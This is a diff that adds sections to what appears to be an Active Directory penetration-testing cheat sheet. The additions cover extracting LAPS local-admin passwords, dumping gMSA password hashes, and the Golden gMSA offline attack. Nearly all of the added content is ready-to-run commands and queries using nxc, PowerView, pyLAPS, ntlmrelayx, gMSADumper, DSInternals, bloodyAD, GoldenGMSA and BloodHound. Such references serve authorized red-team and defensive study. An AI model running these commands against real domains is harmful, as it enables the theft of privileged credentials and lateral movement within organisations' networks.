@@ -281,3 +281,91 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 # 0x0 = no prompt, 0x5 = prompt for consent (default)
 ```
+
+---
+
+## LAPS password extraction
+
+LAPS (Local Administrator Password Solution) stores unique local admin passwords in AD. If you have `ReadLAPSPassword` rights (or `GenericAll`/`AllExtendedRights` on computer objects), you can read them.
+
+```bash
+# Enumerate LAPS with nxc/crackmapexec (from Linux)
+nxc ldap <dc_ip> -u user -p pass -M laps
+nxc ldap <dc_ip> -u user -p pass -M laps -O computer="TARGET-"
+
+# Use LAPS password directly
+nxc smb <target_subnet>/24 -u user-with-laps-read -p pass --laps
+
+# PowerView (from Windows)
+Get-DomainComputer <computer_name> -Properties ms-mcs-AdmPwd,ms-mcs-AdmPwdExpirationTime
+# Windows LAPS (newer):
+Get-DomainComputer <computer_name> -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
+
+# pyLAPS (Python)
+pyLAPS.py --action get -d domain.local -u user -p pass --dc-ip <dc_ip>
+
+# LAPS via NTLM relay (relay to LDAP, dump LAPS)
+impacket-ntlmrelayx -t ldaps://<dc_ip> --dump-laps
+
+# Find who can read LAPS passwords
+Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=domain,DC=local" | fl
+```
+
+### BloodHound LAPS queries
+
+```cypher
+// Computers with LAPS enabled
+MATCH (c:Computer {haslaps:true}) RETURN c.name
+
+// Who can read LAPS passwords?
+MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer)
+RETURN n.name, c.name
+```
+
+---
+
+## gMSA password extraction
+
+Group Managed Service Accounts (gMSA) have auto-rotated passwords. If you have `ReadGMSAPassword` rights on the gMSA, you can extract the NT hash.
+
+```bash
+# gMSADumper (Python — from Linux)
+python3 gMSADumper.py -u user -p pass -d domain.local -l <dc_ip>
+
+# nxc module
+nxc ldap <dc_ip> -u user -p pass -M gmsa
+
+# From Windows (PowerShell AD module)
+$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties msDS-ManagedPassword
+$blob = $gmsa.'msDS-ManagedPassword'
+# Parse with DSInternals:
+Import-Module DSInternals
+$pwd = ConvertFrom-ADManagedPasswordBlob $blob
+$pwd.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText
+
+# bloodyAD (Python)
+bloodyAD --host <dc_ip> -d domain.local -u user -p pass get object 'svc_gmsa$' --attr msDS-ManagedPassword
+```
+
+### Golden gMSA attack
+
+If you have compromised a domain and can read KDS root key attributes, you can compute gMSA passwords offline without touching AD again.
+
+```bash
+# Extract KDS root key (requires DA or equivalent)
+# Then use GoldenGMSA tool to compute passwords offline:
+GoldenGMSA.exe gmsainfo
+GoldenGMSA.exe compute --sid <gmsa_sid>
+```
+
+### BloodHound gMSA queries
+
+```cypher
+// Who can read gMSA passwords?
+MATCH p=(n)-[:ReadGMSAPassword]->(m:User)
+RETURN n.name, m.name
+
+// gMSA accounts with admin paths
+MATCH (g:User {gmsa:true})-[:MemberOf*1..]->(group:Group {admincount:true})
+RETURN g.name, collect(group.name)
+```
